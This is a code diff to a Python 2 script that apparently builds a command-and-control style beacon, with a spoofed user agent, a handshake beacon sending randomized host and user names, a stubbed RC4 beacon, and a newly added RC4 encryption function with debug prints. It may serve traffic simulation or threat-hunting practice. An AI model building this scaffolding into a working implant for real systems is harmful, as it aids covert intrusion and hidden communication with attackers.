@@ -7,9 +7,25 @@ user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36
 sleep_interval = 10 # TO DO: Add in sleep interval jitter
 
 
-# TO DO: Wrap everything in a nice try catch statement
+def crypt(data, key):
+    S = range(256); j = 0; out = []
+
+    for i in range(256):
+        j = (j + S[i] + ord(key[i % len(key)])) % 256
+        S[i] , S[j] = S[j] , S[i]
+
+    i = j = 0
+
+    for char in data:
+        i = ( i + 1 ) % 256
+        j = ( j + S[i] ) % 256
+        S[i] , S[j] = S[j] , S[i]
+        out.append(chr(ord(char) ^ S[(S[i] + S[j]) % 256]))
+
+    return "".join(out)
 
 
+# TO DO: Wrap handshake beacon in a nice try catch statement
 def handshake_beacon():
     hostname_var = "".join(random.choice(string.lowercase) for i in range(10))
     current_user_var = "".join(random.choice(string.lowercase) for i in range(10))
@@ -38,11 +54,11 @@ def handshake_beacon():
     return response
 
 
+# TO DO: Wrap RC4 beacon in a nice try catch statement
 def rc4_beacon():
     print "rc4 beacon here"
 
-
-# TO DO: Include crypto() function here
+    # TO DO: Add in RC4 beacon code here
 
 
 if __name__ == "__main__":
@@ -53,6 +69,10 @@ if __name__ == "__main__":
             k = handshake_beacon()
 
         else:
+            encrypted = crypt("Hunter is super kewl.", k) # DEBUGGING
+            decrypted = crypt(encrypted, k) # DEBUGGING
+            print "Encrypted: " + encrypted # DEBUGGING
+            print "Decrypted: " + decrypted # DEBUGGING
             rc4_beacon()
 
         counter += 1
